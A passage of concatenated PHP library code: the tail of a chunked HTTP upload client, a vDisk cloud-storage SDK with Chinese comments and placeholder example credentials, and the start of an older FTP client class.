			$socket = fsockopen($host, $port, $errno, $error, 30);
			if (!$socket) {
				$this->setError(self::NetError + $errno, $error);			
				fclose($fp);
				return false;
			}

			# splice request
			$request  = "POST $path HTTP/1.1\r\n";
			$request .= implode("\r\n", $headers) . "\r\n";
			$request .= "Connection: close\r\n\r\n";
			if ($this->debug_) {
				echo "[debug] $request";
			}
			if (!$resuming) {
				$request .= $content;	
			}

			# send request
			fwrite($socket, $request);

			# read response
			$response = "";
			while ($t = fread($socket, 128)) {
				$response .= $t;
			}

			# close socket
			fclose($socket);

			if ($this->debug_) {
				echo "[debug] $response\n";	
			}

			$response = new SimpleHttpResponse($response);

			if ($response->code() != 200) {
			
				$this->setError($response->code(), $response->message());	
				fclose($fp);
				return false;
			}

			if (!($cm = $this->parseResponseBody($response->content()))) {
			
				$this->setError(self::FatalInternalError, "server error, contact administrator");
				return false;
			}

			list ($code, $message) = $cm;

			if ($code == self::FileRangeOnly ||
				$code == self::Ok || 
				$code == self::FileRangeError) {
				list($begin, $end) = explode("-", $response->headers("NextFileRange"));

				if ($this->debug_) {
					echo "[debug] next transfer $begin - $end\n";	
				}
			}

			$this->setError($code, $message);

			if ($code == self::Ok) {
				$token = $message;
				if ($first) {
					$this->setSession($session_name, $token);
					$this->setCacheExtra($session_name, $time.'|'.$the_user_token);
				}
				list($first, $resuming) = array(0, 0);
			} else if ($code == self::SessionFinish) {
				$finished = 1;
			} else if ($code == self::FileRangeOnly) {
				list($first, $resuming) = array(0, 0);	
			} else if ($code == self::FileRangeError || $code == self::Error || $code == self::InternalError) {
				if ($this->debug_) {
					echo "[debug] $message, auto retry";
				}
			} else {
				if ($this->debug_) {
					echo "[debug] $message, return";	
				}
				break;
			}

			# print progress
			if ($this->showProgress_) {
				if ($finished) {
					echo "100%\n";
				} else {
					$ratio = intval($begin * 100 / $stat["size"]);
					if ($ratio - $lastRatio >= $this->progressStep_) {
						$lastRatio = $ratio;
						echo "$ratio%\n";
					}
				}
			}
			
		}
		if ($finished) {
			$this->delSession($session_name);
			$this->delCacheExtra($session_name);
		}
		return $finished;
	}

	private function setError($errno, $error) {
		$this->errno_ = $errno;
		$this->error_ = $error;	
	}

	private function setHeader(&$headers, $name, $value)
	{
		array_push($headers, "$name: $value");
	}

	public function errno() {
		return $this->errno_;	
	}

	public function error() {
		return $this->error_;
	}

	private function getContent($fp, $offset, $len)
	{
		fseek($fp, $offset, SEEK_SET);
		return fread($fp, $len);
	}

	private function signature($content) {
		$signature = hash_hmac('sha256', $content, $this->secretkey_, false);
		if ($this->debug_) {
			echo "[debug] content: $content" . "\n";
			echo "[debug] signature: $signature" . "\n";
		}
		return $signature;
	}

	private function getSession($file)
	{
		$file = ".$file". self::SessionFileSuffix;
		$token = false;
		if (file_exists($file)) {
			$token = file_get_contents($file);
		}
		if ($this->debug_ && $token !== false) {
			echo "[debug] get session $token\n";		
		}
		return $token;
	}

	private function setSession($file, $token)
	{
		$file = ".$file". self::SessionFileSuffix;
		$rc = file_put_contents($file, $token);
		if ($this->debug_ && $rc !== false) {
			echo "[debug] set session $token\n";	
		}
		return $rc == count($token);
	}

	private function delSession($file)
	{
		$file = ".". $file. self::SessionFileSuffix;
		@unlink($file);
		return true;
	}
	
	
	private function getCacheExtra($name)
	{
		$file = ".$name". self::CacheExtraFileSuffix;
		$extra = false;
		if (file_exists($file)) {
			$extra = file_get_contents($file);
		}
		if ($this->debug_ && $extra !== false) {
			echo "[debug] get CacheExtra $extra\n";		
		}
		return $extra;
	}
	
	private function setCacheExtra($name, $value)
	{
		$file = ".$name". self::CacheExtraFileSuffix;
		$rc = file_put_contents($file, $value);
		if ($this->debug_ && $rc !== false) {
			echo "[debug] set CacheExtra $value\n";	
		}
		return $rc == count($value);
	}
	
	private function delCacheExtra($name)
	{
		$file = ".". $name. self::CacheExtraFileSuffix;
		@unlink($file);
		return true;
	}

	private function parseResponseBody($body)
	{
		$a = explode(":", $body, 2);
		if ($a == false) return false;
		return $a;
	}

	private $accesskey_;
	private $secretkey_;
	private $chunkSize_;
	private $useRest_;

	private $errno_;
	private $error_;

	private $showProgress_;
	private $debug_;

	private $proxyHost_;
	private $proxyPort_;
	private $proxyUser_;
	private $proxyPasswd_;
}

# storengine:s3; domain:wepan.cloudboxapi; acl:reserve

class FUploadExtra
{
	public function __construct($opt = null)
	{
		$this->info_["storengine"] = "s3";
		$this->info_["acl"] = "reserve";

		if ($opt) $this->info_ = array_merge($this->info_, $opt);
	}

	# stor
	public function storengine($v = null)
   	{
		if ($v) $this->info_["storengine"] = $v;
		return $this->info_["storengine"];	
	}

	public function domain($v = null)
   	{
		if ($v) $this->info_["domain"] = $v;
		return $this->info_["domain"];
	}

	public function toString($opt = null)
	{
		if ($opt) $this->info_ = array_merge($this->info_, $opt);

		if (!array_key_exists("storengine", $this->info_) || $this->info_["storengine"] == "")
		   	throw new Exception("storengine not set", 1);
		if (!array_key_exists("domain", $this->info_) || $this->info_["domain"] == "")
		   	throw new Exception("domain not set", 2);

		$s = "";
		while (list($key, $value) = each($this->info_)) {
			$s .= "$key: $value; ";
		}
		return $s;
	}

	private $info_;
}



class SimpleHttpResponse
{
	public function __construct($response)
	{
		list($headerString, $this->content_) = explode("\r\n\r\n", $response, 2);
		list($statusLine, $headerString) = explode("\r\n", $headerString, 2);
		list( , $this->code_, $this->message_) = explode(" ", $statusLine, 3);
		foreach (explode("\r\n", $headerString) as $item) {
			list($name, $value) = explode(":", $item);
			$this->headers_[strtolower($name)] = ltrim($value);
		}
	}

	public function code()
	{
		return $this->code_;	
	}

	public function message()
	{
		return $this->message_;	
	}

	public function headers($name=null)
	{
		if ($name) {
			$name = strtolower($name);	
			if (array_key_exists($name, $this->headers_)) {
				return $this->headers_[$name];	
			} else {
				return null;	
			}
		}
		return $this->headers_;	
	}

	public function content()
	{
		
		return $this->content_;	
	}

	private $code_;
	private $message_;
	private $headers_;
	private $content_;
}


?>

<?php 

/**
 * vDisk sdk for SAE and Standard PHP (SaeFetchurl or CURL)
 *
 * @package vDisk
 *
 * @version $Id$
 *
 * @author Bruce Chen
 *
 */
 
 
/**
 * URL

define(URL_GET_TOKEN, 'http://openapi.vdisk.me/?m=auth&a=get_token');
define(URL_KEEP_TOKEN, 'http://openapi.vdisk.me/?m=user&a=keep_token');
define(URL_UPLOAD_FILE, 'http://openapi.vdisk.me/?m=file&a=upload_file');
define(URL_UPLOAD_SHARE_FILE, 'http://openapi.vdisk.me/?m=file&a=upload_share_file');
define(URL_CREATE_DIR, 'http://openapi.vdisk.me/?m=dir&a=create_dir');
define(URL_GET_LIST, 'http://openapi.vdisk.me/?m=dir&a=get_list');
define(URL_GET_QUOTA, 'http://openapi.vdisk.me/?m=file&a=get_quota');
define(URL_UPLOAD_WITH_SHA1, 'http://openapi.vdisk.me/?m=file&a=upload_with_sha1');
define(URL_GET_FILE_INFO, 'http://openapi.vdisk.me/?m=file&a=get_file_info');
define(URL_DELETE_DIR, 'http://openapi.vdisk.me/?m=dir&a=delete_dir');
define(URL_DELETE_FILE, 'http://openapi.vdisk.me/?m=file&a=delete_file');
define(URL_COPY_FILE, 'http://openapi.vdisk.me/?m=file&a=copy_file');
define(URL_MOVE_FILE, 'http://openapi.vdisk.me/?m=file&a=move_file');
define(URL_RENAME_FILE, 'http://openapi.vdisk.me/?m=file&a=rename_file');
define(URL_RENAME_DIR, 'http://openapi.vdisk.me/?m=dir&a=rename_dir');
define(URL_MOVE_DIR, 'http://openapi.vdisk.me/?m=dir&a=move_dir');
define(URL_SHARE_FILE, 'http://openapi.vdisk.me/?m=file&a=share_file');
define(URL_CANCEL_SHARE_FILE, 'http://openapi.vdisk.me/?m=file&a=cancel_share_file');
define(URL_RECYCLE_GET_LIST, 'http://openapi.vdisk.me/?m=recycle&a=get_list');
define(URL_TRUNCATE_RECYCLE_GET, 'http://openapi.vdisk.me/?m=recycle&a=truncate_recycle');
define(URL_RECYCLE_DELETE_FILE, 'http://openapi.vdisk.me/?m=recycle&a=delete_file');
define(URL_RECYCLE_DELETE_DIR, 'http://openapi.vdisk.me/?m=recycle&a=delete_dir');
define(URL_RECYCLE_RESTORE_FILE, 'http://openapi.vdisk.me/?m=recycle&a=restore_file');
define(URL_RECYCLE_RESTORE_DIR, 'http://openapi.vdisk.me/?m=recycle&a=restore_dir');
define(URL_GET_DIRID_WITH_PATH, 'http://openapi.vdisk.me/?m=dir&a=get_dirid_with_path');
define(URL_EMAIL_SHARE_FILE, 'http://openapi.vdisk.me/?m=file&a=email_share_file');
 */

/*
 * 使用方法:
 * 
 * include_once('vDisk.class.php');
 * $appkey = 1234567;
 * $appsecret = '123456739cc20556637a576ea1234567';
 * $username = 'username@gmail.com';
 * $password = '123456';
 * 
 * $vdisk = new vDisk($appkey, $appsecret);
 * 
 * $vdisk->get_token($username, $password);
 * $_SESSION['token'] = $vdisk->token;
 * 
 * $vdisk->keep_token();
 * 
 * //$r = $vdisk->upload_share_file('文件.txt', 0);
 * //$r = $vdisk->get_list(0);
 * //$r = $vdisk->get_quota();
 * //$r = $vdisk->upload_with_md5('测试.pdf', '03d5717869bb075e3bad73b527fabc8a');
 * //$r = $vdisk->get_file_info(219379);
 * //$r = $vdisk->create_dir('测试一下');
 * //$r = $vdisk->delete_dir(35647);
 * //$r = $vdisk->delete_file(123);
 * //$r = $vdisk->copy_file(219379, 0, '副本.txt');
 * //$r = $vdisk->move_file(219379, 0, '副本.txt');
 * //$r = $vdisk->rename_file(219379, '新的新的新的.z');
 * //$r = $vdisk->rename_dir(3929, '新的新的新的');
 * $r = $vdisk->move_dir(3929, "我的图片们", 0);
 * print_r($r);
 * 
 * 
*/


class vDisk 
{

	public $appkey;
	public $appsecret;
	public $username;
	public $password;
	public $token;
	
	private $_errno;	
	private $_error;
	
	
	/**
	 * 构造函数
	 *
	 * @param string $app_key 分配给你的appkey
	 * @param string $app_secret 分配给你的appsecret
	 *
 	 * @return void 
	 *
	 * @author Bruce Chen
	 *
 	*/
	public function __construct($app_key, $app_secret)
	{
		if(!($app_key && $app_secret)) 
		{	
			$this->set_error(-2, 'app_key or app_secret empty');
			return;
		}
		
		$this->appkey = $app_key;
		$this->appsecret = $app_secret;
		$this->set_error(-1, 'empty');
	}
	
	
	/**
	 * 获得token
	 *
	 * @param string $username 
	 * @param string $password 
	 * @param string $app_type 可选参数, 如:$app_type=sinat (注意: 目前支持微博帐号)
	 *
 	 * @return array 
	 *
	 * @author Bruce Chen
	 *
 	*/
	public function get_token($username, $password, $app_type=null)
	{
		
		$this->username = $username;
		$this->password = $password;
		
		$time = time();
		$param = array( 
		
				'account' => $username, 
				'password' => $password, 
				'time' => $time,
				'appkey' => $this->appkey,
				'signature' => hash_hmac('sha256', "account={$username}&appkey={$this->appkey}&password={$password}&time={$time}", $this->appsecret, false)
			);
	
		$data = $this->_request(URL_GET_TOKEN, $param);
		
		if($data && $data['err_code'] == 0)
		{
			$this->token = $data['data']['token'];
		}
		
		return $data;
	}
	
	
	/**
	 * 保持token
	 *
	 * @param string $token 可选参数
	 *
 	 * @return array 
	 *
	 * @author Bruce Chen
	 *
 	*/
	public function keep_token($token=null)
	{
		if($token)
		{
			$this->token = $token;
		}
		
		if($this->token)
		{
			$param = array(
			
					'token' => $this->token
				);
				
			$data = $this->_request(URL_KEEP_TOKEN, $param);
			
			return $data;
		}
		else
		{
			return false;
		}
	}
	
	
	/**
	 * 上传文件(10M以下)
	 *
	 * @param string $file_path 本地文件真实路径
	 *
	 * @param int $dir_id 目录id
	 *
	 * @param string $cover 可选参数, yes:覆盖; no:如有重名返回错误信息
	 *
 	 * @return array 
	 *
	 * @author Bruce Chen
	 *
 	*/
	public function upload_file($file_path, $dir_id, $cover='yes')
	{
		
		if($this->token)
		{
			$param = array(
			
				'file' => '@'.$file_path,
				'token' => $this->token,
				'dir_id' => $dir_id,
				'cover' => $cover
			);
			
			$data = $this->_request(URL_UPLOAD_FILE, $param);
			
			return $data;
		}
		else
		{
			return false;
		}
		
	}
	
	
	/**
	 * 上传并分享文件(10M以下)
	 *
	 * @param string $file_path 本地文件真实路径
	 *
	 * @param int $dir_id 目录id
	 *
	 * @param string $cover 可选参数, yes:覆盖; no:如有重名返回错误信息
	 *
 	 * @return array 包含分享后的url
	 *
	 * @author Bruce Chen
	 *
 	*/
	public function upload_share_file($file_path, $dir_id, $cover='yes')
	{
		if($this->token)
		{
			$param = array(
			
				'file' => '@'.$file_path,
				'token' => $this->token,
				'dir_id' => $dir_id,
				'cover' => $cover
			);
			
			$data = $this->_request(URL_UPLOAD_SHARE_FILE, $param);
			
			return $data;
		}
		else
		{
			return false;
		}
	}
	
	
	/**
	 * 创建目录
	 *
	 * @param string $create_name 目录的名称
	 *
	 * @param int $parent_id 父目录的id
	 *
 	 * @return array 
	 *
	 * @author Bruce Chen
	 *
 	*/
	public function create_dir($create_name, $parent_id=0)
	{
		if($this->token)
		{
			$param = array(

				'token' => $this->token,
				'create_name' => $create_name,
				'parent_id' => $parent_id
			);
			
			$data = $this->_request(URL_CREATE_DIR, $param);
			
			return $data;
		}
		else
		{
			return false;
		}

	}
	
	
	/**
	 * 获得列表(包括文件和子目录)
	 *
	 * @param int $dir_id 目录的id
	 *
 	 * @return array 
	 *
	 * @author Bruce Chen
	 *
 	*/
	public function get_list($dir_id)
	{
		if($this->token)
		{
			$param = array(

				'token' => $this->token,
				'dir_id' => $dir_id
			);
			
			$data = $this->_request(URL_GET_LIST, $param);
			
			return $data;
		}
		else
		{
			return false;
		}
	}
	
	
	/**
	 * 获得容量信息
	 *
 	 * @return array 
	 *
	 * @author Bruce Chen
	 *
 	*/
	public function get_quota()
	{
		if($this->token)
		{
			$param = array(

				'token' => $this->token
			);
			
			$data = $this->_request(URL_GET_QUOTA, $param);
			
			return $data;
		}
		else
		{
			return false;
		}
	}
	
	
	/**
	 * 无文件上传(md5)
	 *
	 * @param string $file_name 上传以后的文件名
	 * @param string $md5 要上传文件的md5值
	 * @param int $dir_id 目标目录的id, 0为根目录
	 *
 	 * @return array 
	 *
	 * @author Bruce Chen
	 *
 	*/
	public function upload_with_sha1($file_name, $sha1, $dir_id=0)
	{
		if($this->token)
		{
			$param = array(

				'token' => $this->token,
				'file_name' => $file_name,
				'sha1' => $sha1,
				'dir_id' => $dir_id
			);
			
			$data = $this->_request(URL_UPLOAD_WITH_SHA1, $param);
			
			return $data;
		}
		else
		{
			return false;
		}
	}
	
	
	/**
	 * 获得文件的信息
	 *
	 * @param int $fid 文件的id
	 *
 	 * @return array 
	 *
	 * @author Bruce Chen
	 *
 	*/
	public function get_file_info($fid)
	{
		if($this->token)
		{
			$param = array(

				'token' => $this->token,
				'fid' => $fid,
			);
			
			$data = $this->_request(URL_GET_FILE_INFO, $param);
			
			return $data;
		}
		else
		{
			return false;
		}
	}
	
	
	/**
	 * 删除目录
	 *
	 * @param int $dir_id 目录的id
	 *
 	 * @return array 
	 *
	 * @author Bruce Chen
	 *
 	*/
	public function delete_dir($dir_id)
	{
		if($this->token)
		{
			$param = array(

				'token' => $this->token,
				'dir_id' => $dir_id,
			);
			
			$data = $this->_request(URL_DELETE_DIR, $param);
			
			return $data;
		}
		else
		{
			return false;
		}
	}
	
	
	/**
	 * 删除文件
	 *
	 * @param int $fid 文件的id
	 *
 	 * @return array 
	 *
	 * @author Bruce Chen
	 *
 	*/
	public function delete_file($fid)
	{
		if($this->token)
		{
			$param = array(

				'token' => $this->token,
				'fid' => $fid,
			);
			
			$data = $this->_request(URL_DELETE_FILE, $param);
			
			return $data;
		}
		else
		{
			return false;
		}
	}
	
	
	/**
	 * 复制文件
	 *
	 * @param int $fid 要复制文件的id
	 * @param int $to_dir_id 目标目录的id
	 * @param string $new_name 副本文件的名称
	 *
 	 * @return array 
	 *
	 * @author Bruce Chen
	 *
 	*/
	public function copy_file($fid, $to_dir_id, $new_name)
	{
		if($this->token)
		{
			$param = array(

				'token' => $this->token,
				'fid' => $fid,
				'to_dir_id' => $to_dir_id,
				'new_name' => $new_name
			);
			
			$data = $this->_request(URL_COPY_FILE, $param);
			
			return $data;
		}
		else
		{
			return false;
		}
	}
	
	
	/**
	 * 移动文件
	 *
	 * @param int $fid 要移动文件的id
	 * @param int $to_dir_id 目标目录的id
	 * @param string $new_name 移动后的文件名称
	 *
 	 * @return array 
	 *
	 * @author Bruce Chen
	 *
 	*/
	public function move_file($fid, $to_dir_id, $new_name)
	{
		if($this->token)
		{
			$param = array(

				'token' => $this->token,
				'fid' => $fid,
				'to_dir_id' => $to_dir_id,
				'new_name' => $new_name
			);
			
			$data = $this->_request(URL_MOVE_FILE, $param);
			
			return $data;
		}
		else
		{
			return false;
		}
	}
	
	
	/**
	 * 重命名文件
	 *
	 * @param int $fid 文件的id
	 * @param string $new_name 新文件名称
	 *
 	 * @return array 
	 *
	 * @author Bruce Chen
	 *
 	*/
	public function rename_file($fid, $new_name)
	{
		if($this->token)
		{
			$param = array(

				'token' => $this->token,
				'fid' => $fid,
				'new_name' => $new_name
			);
			
			$data = $this->_request(URL_RENAME_FILE, $param);
			
			return $data;
		}
		else
		{
			return false;
		}		
	}
	
	
	/**
	 * 重命名目录
	 *
	 * @param int $dir_id 目录的id
	 * @param string $new_name 新名称
	 *
 	 * @return array 
	 *
	 * @author Bruce Chen
	 *
 	*/
	public function rename_dir($dir_id, $new_name)
	{
		if($this->token)
		{
			$param = array(

				'token' => $this->token,
				'dir_id' => $dir_id,
				'new_name' => $new_name
			);
			
			$data = $this->_request(URL_RENAME_DIR, $param);
			
			return $data;
		}
		else
		{
			return false;
		}	
	}
	
	
	/**
	 * 移动目录
	 *
	 * @param int $dir_id 目录的id
	 * @param string $new_name 移动后的名称
	 * @param int $to_parent_id 目标目录的id
	 *
 	 * @return array 
	 *
	 * @author Bruce Chen
	 *
 	*/
	public function move_dir($dir_id, $new_name, $to_parent_id)
	{
		if($this->token)
		{
			$param = array(

				'token' => $this->token,
				'dir_id' => $dir_id,
				'new_name' => $new_name,
				'to_parent_id' => $to_parent_id
			);
			
			$data = $this->_request(URL_MOVE_DIR, $param);
			
			return $data;
		}
		else
		{
			return false;
		}
	}
	
		
	/**
	 * 分享文件
	 *
	 * @param int $fid 文件的id
	 *
 	 * @return array 
	 *
	 * @author Bruce Chen
	 *
 	*/
	public function share_file($fid)
	{
		if($this->token)
		{
			$param = array(

				'token' => $this->token,
				'fid' => $fid
			);
			
			$data = $this->_request(URL_SHARE_FILE, $param);
			
			return $data;
		}
		else
		{
			return false;
		}
	}
	
	
	/**
	 * 取消分享
	 *
	 * @param int $fid 文件的id
	 *
 	 * @return array 
	 *
	 * @author Bruce Chen
	 *
 	*/
	public function cancel_share_file($fid)
	{
		if($this->token)
		{
			$param = array(

				'token' => $this->token,
				'fid' => $fid
			);
			
			$data = $this->_request(URL_CANCEL_SHARE_FILE, $param);
			
			return $data;
		}
		else
		{
			return false;
		}
	}
	
	
	/**
	 * 获得回收站列表
	 *
	 * @param int $page 第几页
	 * @param int $page_size 每页显示条数
	 *
 	 * @return array 
	 *
	 * @author Bruce Chen
	 *
 	*/
	public function recycle_get_list($page=1, $page_size=25)
	{
		if($this->token)
		{
			$param = array(

				'token' => $this->token,
				'page' => $page,
				'page_size' => $page_size
			);
			
			$data = $this->_request(URL_RECYCLE_GET_LIST, $param);
			
			return $data;
		}
		else
		{
			return false;
		}
	}
	
	
	/**
	 * 清空回收站
	 *
 	 * @return array 
	 *
	 * @author Bruce Chen
	 *
 	*/
	public function truncate_recycle()
	{
		if($this->token)
		{
			$param = array(

				'token' => $this->token
			);
			
			$data = $this->_request(URL_TRUNCATE_RECYCLE_GET, $param);
			
			return $data;
		}
		else
		{
			return false;
		}
	}
	
	/**
	 * 从回收站中彻底删除一个文件
	 *
	 * @param int $fid 文件id
	 *
 	 * @return array 
	 *
	 * @author Bruce Chen
	 *
 	*/
	public function recycle_delete_file($fid)
	{
		if($this->token)
		{
			$param = array(

				'token' => $this->token,
				'fid' => $fid
			);
			
			$data = $this->_request(URL_RECYCLE_DELETE_FILE, $param);
			
			return $data;
		}
		else
		{
			return false;
		}
	}
	
	/**
	 * 从回收站中彻底删除一个目录
	 *
	 * @param int $dir_id 目录的id
	 *
 	 * @return array 
	 *
	 * @author Bruce Chen
	 *
 	*/
	public function recycle_delete_dir($dir_id)
	{
		if($this->token)
		{
			$param = array(

				'token' => $this->token,
				'dir_id' => $dir_id
			);
			
			$data = $this->_request(URL_RECYCLE_DELETE_DIR, $param);
			
			return $data;
		}
		else
		{
			return false;
		}
	}
	
	
	
	/**
	 * 从回收站中还原一个文件
	 *
	 * @param int $fid 文件id
	 *
 	 * @return array 
	 *
	 * @author Bruce Chen
	 *
 	*/
	public function restore_file($fid)
	{
		if($this->token)
		{
			$param = array(

				'token' => $this->token,
				'fid' => $fid
			);
			
			$data = $this->_request(URL_RECYCLE_RESTORE_FILE, $param);
			
			return $data;
		}
		else
		{
			return false;
		}
	}
	
	
	/**
	 * 从回收站中还原一个目录
	 *
	 * @param int $dir_id 目录的id
	 *
 	 * @return array 
	 *
	 * @author Bruce Chen
	 *
 	*/
	public function restore_dir($dir_id)
	{
		if($this->token)
		{
			$param = array(

				'token' => $this->token,
				'dir_id' => $dir_id
			);
			
			$data = $this->_request(URL_RECYCLE_RESTORE_DIR, $param);
			
			return $data;
		}
		else
		{
			return false;
		}
	}
	
	/**
	 * 通过路径得到目录
	 *
	 * @param string $path 路径
	 *
 	 * @return array 
	 *
	 * @author Bruce Chen
	 *
 	*/
	public function get_dirid_with_path($path)
	{
		if($this->token)
		{
			$param = array(

				'token' => $this->token,
				'path' => $path
			);
			
			$data = $this->_request(URL_GET_DIRID_WITH_PATH, $param);
			
			return $data;
		}
		else
		{
			return false;
		}
	}
	
	
	/**
	 * 通过邮件发送文件链接
	 *
	 * @param int $fid
	 * @param string $to_email
	 *
 	 * @return array 
	 *
	 * @author Bruce Chen
	 *
 	*/
	public function email_share_file($fid, $to_email)
	{
		if($this->token)
		{
			$param = array(

				'token' => $this->token,
				'fid' => $fid,
				'to_email' => $to_email
			);
			
			$data = $this->_request(URL_EMAIL_SHARE_FILE, $param);
			
			return $data;
		}
		else
		{
			return false;
		}
	}
	
	
	/**
	 * 发送http请求, 兼容SEA的Fetchurl, 私有方法
	 *
	 * @param string $url 
	 * @param array $array  POST DATA ($array=null为GET方式)
	 *
 	 * @return array 
	 *
	 * @author Bruce Chen
	 *
 	*/
	private function _request($url, $array=null)
	{
		if(!isset($_SERVER['HTTP_APPNAME']))
		{
			$curl = curl_init();
			curl_setopt($curl, CURLOPT_URL, $url);
			curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
			if($array != null)
			{
				curl_setopt($curl, CURLOPT_POST, true);
				curl_setopt($curl, CURLOPT_POSTFIELDS, $array);
			}
			$data = curl_exec($curl);
			curl_close($curl);
			if($arr = json_decode($data, true))
			{	
				$this->set_error($arr['err_code'], $arr['err_msg']);
				return $arr;
			}
			else
			{
				$this->set_error(-1, 'empty');
				return false;
			}
		}
		else
		{
			if($array != null)
			{
				$this->_f()->setMethod('post');
				$this->_f()->setPostData($array);			
			}
			
			$data = $this->_f()->fetch($url);
		
			if($arr = json_decode($data, true))
			{
				$this->set_error($arr['err_code'], $arr['err_msg']);	
				return $arr;
			}
			else
			{	
				$this->set_error(-1, 'empty');
				return false;
			}
		}
					
	}

	/**
	 * 返回SaeFetchurl object, 保证只new一次
	 *
 	 * @return SaeFetchurl object 
	 *
	 * @author Bruce Chen
	 *
 	*/
	private function _f()
	{
		if(!isset($this->_f)) 
			$this->_f = new SaeFetchurl();
		
		return $this->_f;
	}
	
	
	private function set_error($errno, $error) 
	{
		$this->_errno = $errno;
		$this->_error = $error;	
	}
	
	public function errno() 
	{
		return $this->_errno;	
	}

	public function error() 
	{
		return $this->_error;
	}
}




?>

<?php 

		/*
 			FTP 
			Date - Feb 14,2005
			Author - Harish Chauhan
			Email - harishc@ultraglobal.biz

			ABOUT
			This PHP script will use for connect ftp server . You can 
			upload ,download from this class.this class has implemented 
			most of FTP Commands.
		*/

		/*
		
    //$ftp=new FTP(true); //For using port 
    $ftp=new FTP(); // Passive connection 
    $host=$ftpserver; 
    $user=$ftpuname; 
    $pass=$ftppwd; 
    if(!$ftp->connect($host)) 
         die($ftp->error()); 
    echo nl2br($ftp->greet()); 
    $ftp->login($user,$pass); 
    echo "<br>"; 
    echo $ftp->error(); 
    echo "<br>"; 
    echo nl2br($ftp->features()); 
    //$ftp->chdir("www"); 
    echo "<br>"; 
    echo date("M d, Y @ h:i:s",$ftp->mdtm("index.php")); 
    echo "<br>"; 
    //$ftp->cdup("test"); 
    //echo $ftp->read("reference1.html"); 
    //echo $ftp->write("reference1.html"); 
    //$ftp->rename("reference1.html","newFile.html" ); 
    //$ftp->delete("newFile.html"); 
    //$ftp->mkdir("myDir"); 
    //$ftp->rmdir("myDir"); 
    //echo $ftp->pwd(); 
    print_r($ftp->rawlist()); 
    //print_r($ftp->namelist()); 
    //echo $ftp->system(); 
    //echo $ftp->site("CHMOD myFile"); 
    //echo "<br>"; 
    //echo nl2br($ftp->help()); 
    $ftp->noop(); 
    echo "<br>"; 
    echo $ftp->error(); 
    echo "<br>"; 
    $ftp->Verbose=true; 
    echo "<br>"; 
    echo nl2br($ftp->sendMsg()); 		
		
		*/


		if(!defined('CRLF')) define('CRLF',"\r\n");
		if(!defined("FTP_AUTOASCII")) define("FTP_AUTOASCII", -1);
		if(!defined("FTP_BINARY")) define("FTP_BINARY", 1);
		if(!defined("FTP_ASCII")) define("FTP_ASCII", 0);
		if(!defined('FTP_FORCE')) define('FTP_FORCE', TRUE);
		define('FTP_OS_Unix','u');
		define('FTP_OS_Windows','w');
		define('FTP_OS_Mac','m');
		Class FTP
		{
			/* Public variables */
			var $Verbose=FALSE;
			var $OS_local;
			
			/* Private variables */
			var $_lastaction=NULL;
			var $_type;
			var $_umask;
			var $_timeout;
			var $_passive;
			var $_host;
			var $_fullhost;
			var $_port;
			var $_datahost;
			var $_dataport;
			var $_user;
			var $_password;
			var $_connected;
			var $_ready;
			var $_code;
			var $_can_restore;
			var $_port_available;
			var $_error; 
			var $_conn=null;
			var $_dataconn=null;
			var $_greet="";
		
			var $TransferMode=array(FTP_AUTOASCII,FTP_ASCII,FTP_BINARY);
			var $OS_FullName=array(FTP_OS_Unix => 'UNIX',FTP_OS_Windows => 'WINDOWS',FTP_OS_Mac => 'MACOS');
			var $NewLineCode=array(FTP_OS_Unix => "\n",FTP_OS_Mac => "\r",FTP_OS_Windows => "\r\n");
			var $AutoAsciiExt=array("asp","bat","c","cpp","csv","h","htm","html","shtml","ini","log","php","php3","pl","perl","sh","sql","txt");
				

			function FTP($port_mode=FALSE)
			{
				$this->_port_available=($port_mode==TRUE);
				$this->sendMSG("Staring FTP client class with".($this->_port_available?"":"out")." PORT mode support");
				$this->_ready=FALSE;
				$this->_can_restore=FALSE;
				$this->_code=0;
				$this->_message="";
				$this->setUmask(0022);
				$this->setType(FTP_AUTOASCII);
				$this->setTimeout(30);
				$this->passive(!$this->_port_available);
				$this->_user="anonymous";
				$this->_password="anon@ftp.com";
				$this->_datahost=$_SERVER['REMOTE_ADDR'];
			    $this->OS_local=FTP_OS_Unix;
				if(strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') $this->OS_local=FTP_OS_Windows;
				elseif(strtoupper(substr(PHP_OS, 0, 3)) === 'MAC') $this->OS_local=FTP_OS_Mac;
			}

			/* This functiuon set the host
			example popmail::set_host("mail.yoursite.com") */
		
			function set_host($host)
			{
				$this->_host=$host;
			}
			// This functiuon set the portt
			// example popmail::set_port(110)
			function set_port($port)
			{
				$this->_port=$port;
			}
			////This functiuon is to retrive the error of last operation 
			////example popmail::get_error()
			function error()
			{
				if($this->_error)
					return $this->_error;
			}
			function greet()
			{
				return $this->_greet;
			}
			
			
			///Function is used to open connection
			function open($host,$port=21,$reconnect=FALSE)
			{
				if(!is_long($port)) 
				{
		    	    $this->_error="Incorrect port syntax";
					return FALSE;
				}
				else
				{
					$this->_host=$host;
			        $this->_port=$port;
					$this->_dataport=$port-1;
				}
				$this->SendMSG("Host \"".$this->_fullhost."(".$this->_host."):".$this->_port."\"");
				if($reconnect)
				{
					if($this->_connected) {
						$this->SendMSG("Reconnecting");
						$this->close(FTP_FORCE);
						if(!$this->connect()) return FALSE;
					}
				}
				return TRUE;	
			}
			
			function connect($host,$port=21)
			{
				$this->open($host,$port);
				return $this->_connect();			
			}
			
			function login($user="",$password="")
			{
				if(!empty($user))
					$this->_user=$user;
				else
					$this->_user="anonymous";					
				if(!empty($password))
					$this->_password=$password;
				else
					$this->_password="anon@ftp.com";
				$this->_login();
				
			}

			function chmod($dir,$mode)
			{
				return $this->site("CHMOD $mode $dir");
			}
			
			function chdir($dir)
			{
				if(!$this->_ready)
				{
					$this->_error="Please login to FTP server first.";
					return false;
				}
				if(!$this->_put("CWD $dir"))
				{
					$this->_error="Failed to send command to FTP Server.";
					return false;
				}
				else
				{
					$msg=$this->_read();
					if(!$this->_checkReply())
					{
						$this->_error=$msg;
						return false;
					}
				}				
				$this->sendMsg("Directory successfuly changed to $dir.");
				return true;
			}

			function mkdir($dir)
			{
				if(!$this->_ready)
				{
					$this->_error="Please login to FTP server first.";
					return false;
				}
				if(!$this->_put("MKD $dir"))
				{
					$this->_error="Failed to send command to FTP Server.";
					return false;
				}
				else
				{
					$msg=$this->_read();
					if(!$this->_checkReply())
					{
						$this->_error=$msg;
						return false;
					}
				}				
				$this->sendMsg($msg);
				return true;
			}
			
			function rmdir($dir)
			{
				if(!$this->_ready)
				{
					$this->_error="Please login to FTP server first.";
					return false;
				}
				if(!$this->_put("RMD $dir"))
				{
					$this->_error="Failed to send command to FTP Server.";
